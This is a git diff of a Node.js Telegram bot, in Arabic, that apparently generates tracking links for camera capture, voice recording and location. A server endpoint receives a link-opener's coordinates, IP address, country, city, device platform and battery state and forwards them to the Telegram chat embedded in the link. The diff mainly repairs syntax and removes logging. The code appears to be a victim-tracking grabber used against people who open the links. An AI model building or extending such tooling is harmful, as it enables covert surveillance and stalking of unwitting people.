@@ -171,39 +171,32 @@ app.post('/submitLocation', upload.none(), async (req, res) => {
     const longitude = req.body.longitude;
     const additionalData = JSON.parse(req.body.additionalData || '{}');
 
-    console.log('Received data:', { chatId, latitude, longitude, additionalData });
-
     if (!latitude || !longitude) {
         console.error('No location data received');
         return res.status(400).json({ error: 'No location data received' });
     }
 
     const caption = `
-    معلومات إضافية:
-    IP: ${additionalData.ip}
-    الدولة: ${additionalData.country}
-    المدينة: ${additionalData.city}
-    المنصة: ${additionalData.platform}
-    إصدار الجهاز: ${additionalData.deviceVersion}
-    مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-    الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
+معلومات إضافية:
+IP: ${additionalData.ip}
+الدولة: ${additionalData.country}
+المدينة: ${additionalData.city}
+المنصة: ${additionalData.platform}
+إصدار الجهاز: ${additionalData.deviceVersion}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
     `;
 
-    console.log('Prepared caption:', caption);
-
     try {
-        console.log('Attempting to send location...');
         await bot.sendLocation(chatId, latitude, longitude);
-        console.log('Location sent successfully, attempting to send message...');
         await bot.sendMessage(chatId, caption);
-        console.log('Message sent successfully');
+        console.log('Location sent successfully');
         res.json({ success: true });
     } catch (error) {
-        console.error('Error sending location or message:', error);
+        console.error('Error sending location:', error);
         res.status(500).json({ error: 'Failed to send location message' });
     }
 });
-
 
 // أوامر البوت
 bot.onText(/\/subscribe (\d+)/, (msg, match) => {
@@ -259,6 +252,8 @@ bot.onText(/\/start/, (msg) => {
     });
 });
 
+
+
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
@@ -268,7 +263,7 @@ bot.on('callback_query', (callbackQuery) => {
         bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-    if (data === 'get_location') {
+    } else if (data === 'get_location') {
         const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
         console.log('Data received:', data);
         console.log('Chat ID:', chatId);
@@ -277,7 +272,9 @@ bot.on('callback_query', (callbackQuery) => {
         bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
             .then(() => console.log('Message sent successfully'))
             .catch(err => console.error('Error sending message:', err));
-    
+    }
+});
+
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     const duration = parseInt(msg.text, 10);
@@ -291,6 +288,7 @@ bot.on('message', (msg) => {
         }
     }
 });
+
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
